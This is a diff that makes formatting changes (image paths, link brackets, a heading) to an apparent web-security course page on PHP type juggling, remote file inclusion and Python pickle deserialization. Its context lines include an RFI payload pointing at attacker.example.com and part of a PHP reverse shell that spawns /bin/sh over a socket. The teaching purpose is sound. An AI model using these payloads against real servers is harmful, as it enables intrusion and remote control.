@@ -13,14 +13,14 @@ The most common server-side language on the web today is still **PHP**.
 There are lots of legacy websites which used this language to begin with, and a complete refactor is just not worth it.
 Today, even if there are better options for the server-side choice, PHP is still pretty popular.
 
-![Server Side Languages Popularity](./assets/language-stats.png)
+![Server Side Languages Popularity](./media/language-stats.png)
 
 Source [here](https://w3techs.com/technologies/overview/programming_language).
 
 There are also lots of different PHP versions, each with its own vulnerabilities.
 A small insight into the distribution of versions across the web is:
 
-![PHP Versions Popularity](./assets/version-stats.png)
+![PHP Versions Popularity](./media/version-stats.png)
 
 Source [here](https://w3techs.com/technologies/details/pl-php).
 
@@ -39,7 +39,7 @@ But this kind of flexibility sometimes causes unexpected errors in the program f
 
 In this section we will discuss **PHP type juggling** and how this can lead to authentication bypass vulnerabilities.
 
-![Type Juggling examples](./assets/type-juggling.png)
+![Type Juggling examples](./media/type-juggling.png)
 
 ## How PHP compares values
 
@@ -88,7 +88,7 @@ The following tables showcase the difference between the two comparison modes:
 
 | Loose comparison    | Strict comparison   |
 | ------------------- | ------------------- |
-| ![Loose comparison](./assets/loose-comparison.png) | ![Strict comparison](./assets/strict-comparison.png) |
+| ![Loose comparison](./media/loose-comparison.png) | ![Strict comparison](./media/strict-comparison.png) |
 
 However, loose type comparison behavior like the one presented above is pretty common in PHP and many built-in functions work in the same way.
 You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?
@@ -393,7 +393,7 @@ Potential web security consequences of a successful **RFI** attack range from **
 **Remote file inclusion** attacks usually occur when an application receives a path to a file as input for a web page and does not properly sanitize it.
 This allows an external URL to be supplied to the include function.
 
-![RFI Attack](./assets/what-is-rfi-attack.png)
+![RFI Attack](./media/what-is-rfi-attack.png)
 
 The above definitions are very similar, so what is the exact difference between the two of them and how does an exploit affect the web application in each case?
 
@@ -446,7 +446,7 @@ Payload: `http://example.com/?file=http://attacker.example.com/evil.php`
 This means that getting a reverse shell on a web server will grant you only the rights of the user running the website.
 In order to get root access on the machine, further **privilege escalation** methods should be employed, which you will learn about in a future session.
 
-### Example of a simple reverse shell in PHP:
+### Example of a simple reverse shell in PHP
 
 ```php
 <?php
@@ -454,6 +454,7 @@ In order to get root access on the machine, further **privilege escalation** met
     $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
 ?>
 ```
+
 # Python Insecure Deserialization / `pickle` module
 
 We have looked at so many PHP vulnerabilities in this session, but you shouldn't be left with the impression that PHP is the only vulnerable language.
@@ -507,6 +508,7 @@ Reading a bit further down in the docs we can see that implementing `__reduce__`
 When a tuple is returned, it must be between two and six items long.
 Optional items can either be omitted, or `None` can be provided as their value.
 The semantics of each item are in order:
+>
 > * A callable object that will be called to create the initial version of the object.
 > * A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. [...]
 
@@ -550,18 +552,18 @@ In conclusion, the code should be properly tested before being put in production
 
 # Further Reading
 
-* https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
-* https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/
-* https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/
-* https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/
-* https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09
-* https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/
-* https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/
-* https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
-* https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
-* https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
-* https://www.whitehatsec.com/blog/magic-hashes/
-* https://davidhamann.de/2020/04/05/exploiting-python-pickle/
+* <https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf>
+* <https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/>
+* <https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/>
+* <https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/>
+* <https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09>
+* <https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/>
+* <https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/>
+* <https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/>
+* <https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/>
+* <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>
+* <https://www.whitehatsec.com/blog/magic-hashes/>
+* <https://davidhamann.de/2020/04/05/exploiting-python-pickle/>
 
 # Activities
 
